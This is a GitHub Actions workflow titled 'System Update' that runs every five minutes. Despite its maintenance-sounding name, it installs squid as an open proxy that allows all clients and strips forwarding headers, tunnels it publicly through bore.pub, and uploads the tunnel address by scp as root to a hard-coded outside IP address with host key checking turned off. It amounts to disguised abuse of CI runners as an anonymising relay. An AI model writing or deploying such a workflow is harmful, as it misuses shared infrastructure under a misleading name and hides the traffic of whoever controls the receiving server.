name: System Update

on:
  workflow_dispatch:
  schedule:
    - cron: '*/5 * * * *'

jobs:
  maintenance:
    runs-on: ubuntu-latest
    steps:
      - name: Install squid
        run: sudo apt update && sudo apt install squid -y

      - name: Config squid
        run: |
          sudo bash -c 'cat > /etc/squid/squid.conf << EOF
          http_port 0.0.0.0:3128
          http_access allow all
          forwarded_for off
          via off
          visible_hostname localhost
          EOF'
          sudo systemctl restart squid
          sudo netstat -tlnp | grep 3128

      - name: Install bore
        run: |
          curl -L https://github.com/ekzhang/bore/releases/download/v0.5.0/bore-v0.5.0-x86_64-unknown-linux-musl.tar.gz | tar xz
          sudo mv bore /usr/local/bin/

      - name: Start bore tunnel
        run: |
          bore local 3128 --to bore.pub > bore.log 2>&1 &
          sleep 10
          cat bore.log

      - name: Test proxy locally
        run: |
          curl -x http://localhost:3128 https://httpbin.org/ip || echo "Proxy not working locally"

      - name: Get address and upload
        env:
          REM: ${{ secrets.REM }}
        run: |
          BORE_URL=$(grep -o 'bore\.pub:[0-9]*' bore.log | head -1)
          echo "Found: ${BORE_URL}"
          echo "${BORE_URL}" > /tmp/proxy.txt
          cat /tmp/proxy.txt
          sudo apt install sshpass -y
          sshpass -p "${REM}" scp -o StrictHostKeyChecking=no /tmp/proxy.txt root@45.144.53.63:/var/www/html/git_enemy3civil.txt
          sleep 240
